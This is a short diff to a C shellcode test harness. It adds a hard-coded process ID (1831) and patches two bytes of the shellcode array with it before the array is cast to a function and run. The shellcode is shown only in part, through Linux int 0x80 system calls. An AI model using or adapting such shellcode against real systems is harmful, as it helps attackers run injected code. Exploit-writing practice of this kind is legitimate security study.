@@ -9,6 +9,7 @@
 #include <stdio.h>
 int main() 
 {
+	unsigned short pid = 1831;
 	
 	char shellcode[] = 
 	"\x31\xc0" /* xor eax, eax */
@@ -21,6 +22,10 @@ int main()
 	"\xcd\x80" /* int 0x80 */
 	"\xb0\x01" /* mov al, 0x01 */
 	"\xcd\x80"; /* int 0x80 */
+
+	shellcode[10] = pid & 0xff;
+	shellcode[11] = (pid >> 8) & 0xff;
+
 	printf("Shellcode length: %d\n", strlen(shellcode));
 	int (*ret)() = (int(*)())shellcode;
 	ret();
